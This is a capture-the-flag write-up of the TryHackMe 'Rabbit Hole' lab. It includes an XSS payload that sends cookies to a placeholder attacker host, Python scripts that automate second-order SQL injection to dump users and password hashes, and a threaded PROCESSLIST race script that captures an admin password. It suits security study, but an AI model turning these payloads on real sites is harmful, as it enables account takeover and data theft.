---
date: 2024-10-29T19:25:05-05:00
# description: ""
image: "/images/THM-RabbitHole/RabbitHole.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Rabbit Hole"
type: "post"
---

* Platform: TryHackMe
* Link: [Rabbit Hole](https://tryhackme.com/r/room/rabbitholeqq)
* Level: Hard
* OS: Linux
---

Rabbit Hole is all about exploiting SQL injection. We discover a second-order SQL injection vulnerability after some failed Cross-Site scripting (XSS) attempts. Using this, we retrieve some password hashes, but they don’t lead to initial access. By combining a python script and a payload leveraging the `PROCESSLIST` command we successfully extract the query containing the `admin` user password which we use to login via SSH and read the flag.

## Scanning

```
./nmap_scan.sh 10.10.233.57 Rabbit_Hole
```

**Results**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-29 18:11 CDT
Nmap scan report for 10.10.233.57
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Your page title here :)
|_http-server-header: Apache/2.4.59 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.03 seconds
```

Our Nmap scan finds two open ports 22 (SSH) and 80 (HTTP),  let's check the web server.

## Enumeration

At `http://rabbithole.thm/` we find a website for a recruitment campaign with some authentication feature, we are also told that "anti-bruteforce measures are in place".

![Rabbit Hole website](/images/THM-RabbitHole/rabbit_hole_website.png)

Let's create an account and login.

![Account registration](/images/THM-RabbitHole/rabbithole_register.png)

On the login page we notice a different message. It tells us that the anti-bruteforce measures are `implemented with database queries`.

![Login page](/images/THM-RabbitHole/rabbithole_loginpage.png)

We find a page displaying the last users logins.

![Users last logins](/images/THM-RabbitHole/rabbithole_logins.png)

We are not able to do anything on this page but logout. But if we pay close attention to the login times for `admin` we notice that the user logs in **every minute** which is odd. Moreover our username is reflected on the website, this can imply a possibility for attacks such as XSS, SQLi, and more.

Before exploring the possible vulnerabilities let's enumerate the target some more.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://rabbithole.thm
```

![Gobuster directory enumeration](/images/THM-RabbitHole/rabbithole_gobuster.png)

The directory enumeration is unfruitful so we move on to subdomain enumeration.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://rabbithole.thm -H "Host: FUZZ.axlle.htb" -ic -fs 723
```

This also does not provide any leads.

![Ffuf subdomain enumeration](/images/THM-RabbitHole/rabbithole_ffuf.png)

We notice that our cookie value is the same for different logins which is not desirable. This would allow attackers to execute some sessions attacks such as session fixation and replay attacks. In our case it means that if we can get our hands on the admin cookie value we can probabbly login as them.

![cookie value first login](/images/THM-RabbitHole/cookievalue_loggedin.png)

![cookie value second login](/images/THM-RabbitHole/2nd_login.png)

### XSS Attempt

Let's attempt some cookie stealing, since the `username` is reflected we will use it.

![Burp request](/images/THM-RabbitHole/burp_req.png)

We are able to register an account with the payload below as the `username`. 

```
<script>var i=new Image(); i.src="http://YOUR_IP:WEBSERVER_PORT/?cookie="+btoa(document.cookie);</script>
```

![Payload for username](/images/THM-RabbitHole/payload_as_username.png)

But logging in with that account produces an error. It reveals that the application is using MariaDB which is just a modified version of MySQL.

![Payload Login error](/images/THM-RabbitHole/login_error_SQLi.png)

This hints at a **second order SQL injection**. We injected the malicious code via our payload when registering the account and it was executed when we logged in. Since the payload did not create any issues at the registering we know that the character `"` is the one causing problems here, which is good as it will serve us for our subsequent SQLis.

Checking our webserver we received some cookie values.

![cookie value received](/images/THM-RabbitHole/cookie_value_xss.png)

Unfortunately everytime I try using one of them I just get logged out, so we can just move to another attack path.

### Second Order SQL injection

The tedious part here is that in order to test our different SQLi payloads we need to create a new user with them and then login to be able to read the query output which is not ideal.

So we will automate the process with the Python script below.

```python
import sys
import requests

def create_user(ip, payload):
    url = f"http://{ip}/register.php"
    data = {
        'username': payload,
        'password': 'password',
        'submit': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.status_code == 200

def login_user(ip, payload):
    url = f"http://{ip}/login.php"
    data = {
        'username': payload,
        'password': 'password',
        'login': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.text

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 auto_sqli.py <IP_ADDRESS> <PAYLOAD>")
        sys.exit(1)

    ip = sys.argv[1]
    payload = sys.argv[2]

    print(f"[+] Creating user with payload: {payload}")
    if create_user(ip, payload):
        print("[+] User created successfully. Attempting login...")
        response_text = login_user(ip, payload)
        print("[+] Login response:")
        print(response_text)
    else:
        print("[-] Failed to create user. Check the payload or connection.")

if __name__ == "__main__":
    main()
```

We will use our script to find the number of columns expected.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1; --'
```

![Second Order SQLi test](/images/THM-RabbitHole/S_SQLi_test.png)

We can read the error message `SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns`.

Let's increment the number of columns with the following payload.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, 2; --'
```

![Second Order SQLi test2](/images/THM-RabbitHole/S_SQLi_test2.png)

This payload works, confirming that **2** columns are expected.

It will be good to know which database we are currently working with.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, database(); --'
```

> If at any point you notice that the IP address is different, it's because I had lost some of the screenshots and I had to go back and retake them.

![Second Order SQLi test2](/images/THM-RabbitHole/current_DB.png)

We are currently in the `web` database, now we list its tables.

![web database content](/images/THM-RabbitHole/S_SQLi_enum.png)

We discover two tables `users` and `logins`, the first one seems interesting.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name="users" AND table_schema=DATABASE(); --'
```

![users table fields](/images/THM-RabbitHole/S_SQLi_enum2.png)

This table has four fields: `id`, `username`, `password`, and `group`. We will check `username` first to see if there are other users.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, username FROM web.users; --'
```

![username field content](/images/THM-RabbitHole/username_list.png)

Besides `admin`, we find `foo` and `bar`. 

Now let's list the content of `password`.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, password FROM web.users; --'
```

![incomplete hashes](/images/THM-RabbitHole/S_SQLi_enum3.png)

We are able to dump the hashes but there is a 16-character limit, resulting in incomplete hashes. In order to overcome this hurdle we will modify our script making use of `SUBSTRING` to split the query into two parts. 

```python
import sys
import requests
from bs4 import BeautifulSoup

def create_user(ip, payload):
    url = f"http://{ip}/register.php"
    data = {
        'username': payload,
        'password': 'password',
        'submit': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.status_code == 200

def login_user(ip, payload):
    url = f"http://{ip}/login.php"
    data = {
        'username': payload,
        'password': 'password',
        'login': 'Submit Query'
    }
    response = requests.post(url, data=data)
    return response.text

def extract_results(html):
    soup = BeautifulSoup(html, 'html.parser')
    results = []
    
    for td in soup.find_all('td'):
        content = td.get_text().strip()
        # Filter out timestamp entries (they start with year)
        if not content.startswith('202'):  # Assumes timestamps start with 202x
            results.append(content)
    
    return results

def modify_payload(payload, substring_range):
    select_pos = payload.upper().find('SELECT')
    from_pos = payload.upper().find('FROM')
    
    if select_pos == -1 or from_pos == -1:
        return payload
        
    select_clause = payload[select_pos:from_pos]
    rest_of_query = payload[from_pos:]
    
    columns = select_clause.replace('SELECT', '').strip().split(',')
    
    modified_columns = []
    for i, col in enumerate(columns):
        col = col.strip()
        if i == len(columns) - 1:  # Last column
            # Handle both simple columns and expressions
            col_content = col.strip('1234567890 ')  # Remove any numeric values
            if col_content:  # If there's a non-numeric column
                col = f"SUBSTRING({col}, {substring_range[0]}, {substring_range[1]})"
        modified_columns.append(col)
    
    modified_payload = payload[:select_pos] + 'SELECT ' + ', '.join(modified_columns) + ' ' + rest_of_query
    return modified_payload

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 auto_sqli.py <IP_ADDRESS> <PAYLOAD>")
        sys.exit(1)

    ip = sys.argv[1]
    original_payload = sys.argv[2]
    
    first_payload = modify_payload(original_payload, (1, 16))
    second_payload = modify_payload(original_payload, (17, 32))

    print(f"[+] Creating user with first payload: {first_payload}")
    if create_user(ip, first_payload):
        print("[+] User created successfully. Attempting first login...")
        first_response = login_user(ip, first_payload)
        first_results = extract_results(first_response)
        
        print(f"[+] Creating user with second payload: {second_payload}")
        if create_user(ip, second_payload):
            print("[+] User created successfully. Attempting second login...")
            second_response = login_user(ip, second_payload)
            second_results = extract_results(second_response)
            
            print("\n[+] Combined results:")
            for i in range(len(first_results)):
                full_result = first_results[i]
                if i < len(second_results) and second_results[i].strip():
                    full_result += second_results[i]
                print(f"  - {full_result}")
        else:
            print("[-] Failed to create user for second query.")
    else:
        print("[-] Failed to create user. Check the payload or connection.")

if __name__ == "__main__":
    main()
```

![full hashes](/images/THM-RabbitHole/full_hashes.png)

```
0e3ab8e45ac1163c2343990e427c66ff
a51e47f646375ab6bf5dd2c42d3e6181
de97e75e5b4604526a2afaed5f5439d7
```

We are unable to crack the `admin` hash and although we crack the two other hashes we cannot use the passwords to connect via SSH.

![cracked passwords](/images/THM-RabbitHole/foobar_pwd.png)

![failed SSH logins](/images/THM-RabbitHole/failed_SSH.png)

We also check the `logins` table but it only contains `username` and `login_time` which will not be helpful.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name="logins" AND table_schema=DATABASE(); --'
```

![logins table](/images/THM-RabbitHole/logins_table.png)

Let's see which other database(s) we have.

```
python3 auto_sqli.py IP_ADDRESS '" UNION SELECT 1, schema_name FROM information_schema.schemata; --'
```

![full databases names](/images/THM-RabbitHole/full_db_names.png)

Besides the `web` database we have the `information_schema` database.

## Queries Extraction

> Full credit for this part goes to `jaxafed` with his write up available [here](https://jaxafed.github.io/posts/tryhackme-rabbit_hole/#extracting-the-current-queries). I was not able to make the link between the automated logins and the database itself.

At this point we have exhausted a lot of options, but there is more to explore. Remember how we had noticed that the admin user was logging in **every minute**, it obviously points to some sort of automation. 

It turns out that we can make use of the `PROCESSLIST` command to see which queries are being made in the background and if our timing is right, the admin password will be exposed. _Read more about `PROCESSLIST` [here](https://mariadb.com/kb/en/information-schema-processlist-table/)._

```python
#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup
import threading
import time

url_base = sys.argv[1]
payload = sys.argv[2]

sessions = {}
results = {}


def create_and_login(i, sqli_payload):
    s = requests.session()
    s.post(url_base + "register.php", data={"username": sqli_payload, "password": "jxf", "submit": "Submit Query"})
    s.post(url_base + "login.php", data={"username": sqli_payload, "password": "jxf", "login": "Submit Query"})
    sessions[i] = s
    return


def fetch_query_result(i):
    r = sessions[i].get(url_base)
    soup = BeautifulSoup(r.text, "html.parser")
    tables = soup.find_all("table", class_="u-full-width")
    output = tables[1].find("td").get_text()
    results[i] = output
    return


threads = []
for i in range(15):
    sqli_payload = f'" UNION SELECT 1, SUBSTR(({payload}), {i * 16 + 1}, 16);#'
    thread = threading.Thread(target=create_and_login, args=(i, sqli_payload))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

while True:
    threads = [threading.Thread(target=fetch_query_result, args=(i,)) for i in range(15)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # check that we are not missing any part of the result
    if all([len(results[i]) <= len(results[i - 1]) for i in range(1, 15)]):
        result = "".join([results[i] for i in range(0, 15)])
        if len(result) > 16:
            print(result)
            sys.exit(0)
            
    time.sleep(1)
```

We need to catch the query when the admin logs in which is every minute, it might require to run the script multiple times in order to get the correct query.

Using the script made by `jaxafed`, we find the query revealing the password.

```
python3 admin_sqli.py 'http://IP_ADDRESS/' 'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%" LIMIT 1'
```

![admin password retrieval](/images/THM-RabbitHole/admin_pwd_retrieval.png)

With the password we login via SSH and read the flag.

![flag location](/images/THM-RabbitHole/flag.png)

I've been enjoying the bump in quality of the TryHackMe challenges recently. If you want to learn more about SQL injections vulnerabilities, I would recommend the SQL injection learning path on PortSwigger available [here](https://portswigger.net/web-security/learning-paths/sql-injection).
